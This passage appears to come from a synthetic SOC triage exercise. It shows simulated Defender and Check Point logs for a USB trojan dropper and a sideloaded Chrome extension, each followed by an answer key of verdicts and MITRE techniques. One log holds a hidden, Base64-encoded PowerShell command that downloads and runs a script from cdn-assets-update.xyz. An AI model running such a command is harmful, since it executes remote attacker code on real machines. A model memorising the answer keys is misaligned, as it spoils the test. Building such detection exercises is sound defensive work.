  "EntityType": "File",
  "EvidenceRole": "Related",
  "EvidenceDirection": null,
  "FileName": "USB_Backup_Tool.exe",
  "FolderPath": "C:\\Users\\h.schneider\\Desktop",
  "SHA1": "a6fc584ea1cc5d80583678eff75963588d276b5c",
  "SHA256": "e5f78b3e3cd7901e89bfd8da08ff1dd412acf7452ba5027f031c6efe64e7196f",
  "FileSize": 245760,
  "ThreatFamily": null,
  "RemoteIP": null,
  "RemoteUrl": null,
  "AccountName": null,
  "AccountDomain": null,
  "AccountSid": null,
  "AccountObjectId": null,
  "AccountUpn": null,
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "LocalIP": null,
  "ProcessCommandLine": null,
  "RegistryKey": null,
  "RegistryValueName": null,
  "RegistryValueData": null,
  "AdditionalFields": null,
  "Severity": "High",
  "MachineGroup": "Workstations"
 }
}
```

#### ANSWER KEY — usb-malware
- evt_usb_01_copy: verdict=- mitre=- authored: USB_Backup_Tool.exe was copied from a removable USB drive (E:\) to the Desktop on WH-TERM-005.
- evt_usb_02_execute: verdict=tp mitre=T1204.002 authored: h.schneider ran USB_Backup_Tool.exe on WH-TERM-005 with explorer.exe as the parent process; the binary is unsigned.
- evt_usb_03_persist: verdict=tp mitre=T1547.001 authored: USB_Backup_Tool.exe wrote a Registry Run key on WH-TERM-005 that relaunches it at every h.schneider logon.
- evt_usb_04_detect: verdict=tp mitre=T1547.001 authored: Microsoft Defender for Endpoint quarantined USB_Backup_Tool.exe on WH-TERM-005 as a known trojan dropper and removed its Registry Run key.


### Story: browser-extension (foundation) — Sideloaded Browser Extension → PowerShell Spawned by Chrome

- 2026-05-25T09:00:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=low | host=WH-TERM-005 | user=truck.driver.012 | "explorer.exe started chrome.exe on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/DeviceProcessEvents)
```json
{
 "time": "2026-05-25T09:00:03.9796011Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-DeviceProcessEvents",
 "properties": {
  "Timestamp": "2026-05-25T09:00:00.0008411Z",
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "ActionType": "ProcessCreated",
  "FileName": "chrome.exe",
  "FolderPath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
  "SHA1": "8818a045c51064a8be64b9efaa7ad99830e9ef94",
  "SHA256": null,
  "MD5": null,
  "ProcessId": 8814,
  "ProcessCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\truck.driver.012\\Downloads\\perf_boost_ext_unpacked\"",
  "ProcessIntegrityLevel": "Medium",
  "ProcessTokenElevation": "TokenElevationTypeLimited",
  "ProcessCreationTime": "2026-05-25T08:59:59.9998041Z",
  "AccountDomain": "GLOBALLOGIS",
  "AccountName": "truck.driver.012",
  "AccountSid": "S-1-5-21-1998959984-2015737603-2032515222-1565",
  "AccountUpn": "truck.driver.012@globallogis.de",
  "AccountObjectId": "4d5e0a64-61ae-4a43-9fa6-abbd838f436a",
  "LogonId": 6724327,
  "InitiatingProcessFileName": "explorer.exe",
  "InitiatingProcessFolderPath": null,
  "InitiatingProcessCommandLine": null,
  "InitiatingProcessId": 3140,
  "InitiatingProcessSHA1": "57583ca811cc733cb599a606b333075a7ccc1d12",
  "InitiatingProcessSHA256": null,
  "InitiatingProcessMD5": null,
  "InitiatingProcessParentFileName": null,
  "InitiatingProcessParentId": null,
  "InitiatingProcessAccountDomain": "GLOBALLOGIS",
  "InitiatingProcessAccountName": "truck.driver.012",
  "InitiatingProcessAccountSid": "S-1-5-21-1998959984-2015737603-2032515222-1565",
  "InitiatingProcessAccountUpn": "truck.driver.012@globallogis.de",
  "InitiatingProcessAccountObjectId": "4d5e0a64-61ae-4a43-9fa6-abbd838f436a",
  "InitiatingProcessLogonId": 6724327,
  "InitiatingProcessIntegrityLevel": "Medium",
  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
  "InitiatingProcessUniqueId": "30000753812535",
  "InitiatingProcessSessionId": 1,
  "IsInitiatingProcessRemoteSession": false,
  "ProcessUniqueId": "30000196175605",
  "CreatedProcessSessionId": 1,
  "IsProcessRemoteSession": false,
  "AdditionalFields": null,
  "ReportId": 199696,
  "AppGuardContainerId": null,
  "MachineGroup": "Workstations"
 }
}
```

- 2026-05-25T09:02:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=high | host=WH-TERM-005 | user=truck.driver.012 | "chrome.exe started powershell.exe on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/DeviceProcessEvents)
```json
{
 "time": "2026-05-25T09:02:05.8508060Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-DeviceProcessEvents",
 "properties": {
  "Timestamp": "2026-05-25T09:02:00.0007464Z",
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "ActionType": "ProcessCreated",
  "FileName": "powershell.exe",
  "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "SHA1": "b350c7219995ccb4be8f05265de1b8c296dc1c47",
  "SHA256": null,
  "MD5": null,
  "ProcessId": 9021,
  "ProcessCommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQBhAHMAcwBlAHQAcwAtAHUAcABkAGEAdABlAC4AeAB5AHoALwBiAC4AcABzADEAJwApAA==",
  "ProcessIntegrityLevel": "Medium",
  "ProcessTokenElevation": "TokenElevationTypeLimited",
  "ProcessCreationTime": "2026-05-25T09:01:59.9998024Z",
  "AccountDomain": "GLOBALLOGIS",
  "AccountName": "truck.driver.012",
  "AccountSid": "S-1-5-21-1998959984-2015737603-2032515222-1565",
  "AccountUpn": "truck.driver.012@globallogis.de",
  "AccountObjectId": "4d5e0a64-61ae-4a43-9fa6-abbd838f436a",
  "LogonId": 6724327,
  "InitiatingProcessFileName": "chrome.exe",
  "InitiatingProcessFolderPath": null,
  "InitiatingProcessCommandLine": null,
  "InitiatingProcessId": 8814,
  "InitiatingProcessSHA1": "bccc9e6a55c0c372b4afdd326dede39592171610",
  "InitiatingProcessSHA256": null,
  "InitiatingProcessMD5": null,
  "InitiatingProcessParentFileName": null,
  "InitiatingProcessParentId": null,
  "InitiatingProcessAccountDomain": "GLOBALLOGIS",
  "InitiatingProcessAccountName": "truck.driver.012",
  "InitiatingProcessAccountSid": "S-1-5-21-1998959984-2015737603-2032515222-1565",
  "InitiatingProcessAccountUpn": "truck.driver.012@globallogis.de",
  "InitiatingProcessAccountObjectId": "4d5e0a64-61ae-4a43-9fa6-abbd838f436a",
  "InitiatingProcessLogonId": 6724327,
  "InitiatingProcessIntegrityLevel": "Medium",
  "InitiatingProcessTokenElevation": "TokenElevationTypeLimited",
  "InitiatingProcessUniqueId": "30000196175605",
  "InitiatingProcessSessionId": 1,
  "IsInitiatingProcessRemoteSession": false,
  "ProcessUniqueId": "30001583774201",
  "CreatedProcessSessionId": 1,
  "IsProcessRemoteSession": false,
  "AdditionalFields": null,
  "ReportId": 577507,
  "AppGuardContainerId": null,
  "MachineGroup": "Workstations"
 }
}
```

- 2026-05-25T09:02:30.000Z | badge=firewall | vendor=Check Point | sev=high | host=WH-TERM-005 | user=truck.driver.012 | "WH-TERM-005 connected to cdn-assets-update.xyz"

NATIVE — Check Point Quantum Security Gateway (checkpoint/url_filtering)
```
<134>1 2026-05-25T09:02:30Z gw-hq-01 CheckPoint 26144 - [action:"Accept"; flags:"411908"; ifdir:"outbound"; ifname:"eth1"; logid:"0"; loguid:"{0x6a141026,0x0,0xf4f09d61,0xfef641db}"; origin:"10.50.0.1"; originsicname:"CN=gw-hq-01,O=mgmt-hq.globallogis.eu.bc4cf7"; sequencenum:"1"; time:"1779699750"; version:"5"; __policy_id_tag:"product=VPN-1 & FireWall-1[db_tag={D19702A6-6F0E-4EBF-B496-BD6512D79DC9};mgmt=mgmt-hq;date=1779580800;policy_name=Corp_Policy\]"; app_category:"Uncategorized"; app_id:"0"; app_risk:"0"; appi_name:"cdn-assets-update.xyz"; dst:"185.220.101.77"; inzone:"Internal"; layer_name:"Network"; layer_name:"Web Control"; layer_uuid:"251569ef-12c5-420d-9500-84fd87381ec3"; layer_uuid:"8e0d9108-deab-4b5e-9eba-eac488132bb7"; match_id:"58"; match_id:"33554461"; matched_category:"Uncategorized"; parent_rule:"0"; parent_rule:"58"; product:"URL Filtering"; proto:"6"; proxy_src_ip:"10.50.10.18"; resource:"https://cdn-assets-update.xyz"; rule_action:"Inline"; rule_action:"Accept"; rule_name:"ALLOW-OUTBOUND-HTTPS"; rule_name:"Allow uncategorized"; rule_uid:"c65bb33b-787f-41e5-881d-6832b2ba4ed1"; rule_uid:"9784c87f-3d28-4571-8a8c-01463286e5f9"; outzone:"External"; s_port:"53718"; service:"443"; service_id:"https"; src:"10.50.10.18"; src_machine_name:"WH-TERM-005"; src_user_name:"truck.driver.012"; xlatesrc:"62.184.27.10"; xlatesport:"55813"; xlatedst:"0.0.0.0"; xlatedport:"0"]
```

- 2026-05-25T09:04:00.000Z | badge=edr | vendor=Microsoft Defender for Endpoint | sev=critical | host=WH-TERM-005 | user=truck.driver.012 | "Threat detected on WH-TERM-005"

NATIVE — Microsoft Defender for Endpoint (mde/AlertEvidence)
```json
{
 "time": "2026-05-25T09:04:02.1286548Z",
 "tenantId": "a43db5fa-ceaf-48b6-a385-9d6162805228",
 "operationName": "Publish",
 "category": "AdvancedHunting-AlertEvidence",
 "properties": {
  "Timestamp": "2026-05-25T09:04:00.0009952Z",
  "AlertId": "da683488824733821681_1169560414",
  "Title": "Malware was prevented",
  "Categories": "[\"Execution\"]",
  "AttackTechniques": "[\"PowerShell (T1059.001)\"]",
  "ServiceSource": "Microsoft Defender for Endpoint",
  "DetectionSource": "Antivirus",
  "EntityType": "File",
  "EvidenceRole": "Related",
  "EvidenceDirection": null,
  "FileName": "background.js",
  "FolderPath": "C:\\Users\\truck.driver.012\\Downloads\\perf_boost_ext_unpacked",
  "SHA1": "621bc15cd75f2aec1757b8c3daff732da6507eeb",
  "SHA256": "70ec1968842931da2c98bc7380025d0ed75cd9529e89e0d96a93180690c1549e",
  "FileSize": 18944,
  "ThreatFamily": null,
  "RemoteIP": null,
  "RemoteUrl": null,
  "AccountName": null,
  "AccountDomain": null,
  "AccountSid": null,
  "AccountObjectId": null,
  "AccountUpn": null,
  "DeviceId": "ced4ccd1aff70d5b8c39e0cd7e9f54318be10106",
  "DeviceName": "WH-TERM-005",
  "LocalIP": null,
  "ProcessCommandLine": null,
  "RegistryKey": null,
  "RegistryValueName": null,
  "RegistryValueData": null,
  "AdditionalFields": null,
  "Severity": "High",
  "MachineGroup": "Workstations"
 }
}
```

#### ANSWER KEY — browser-extension
- evt_bext_01_sideload: verdict=tp mitre=T1176 authored: Chrome relaunched on WH-TERM-005 with a --load-extension flag pointing to an unpacked folder in truck.driver.012's Downloads directory.
- evt_bext_02_powershell: verdict=tp mitre=T1059.001 authored: chrome.exe on WH-TERM-005 spawned powershell.exe directly, with a hidden window and a Base64-encoded command.
- evt_bext_03_beacon: verdict=tp mitre=T1071.001 authored: WH-TERM-005 opened an outbound HTTPS connection to cdn-assets-update.xyz, a domain registered 4 days ago; the firewall allowed the session.
- evt_bext_04_detect: verdict=tp mitre=T1059.001 authored: Microsoft Defender for Endpoint killed the encoded PowerShell process and quarantined the sideloaded extension folder on WH-TERM-005, matching a known loader (family: ScriptBridge-variant).
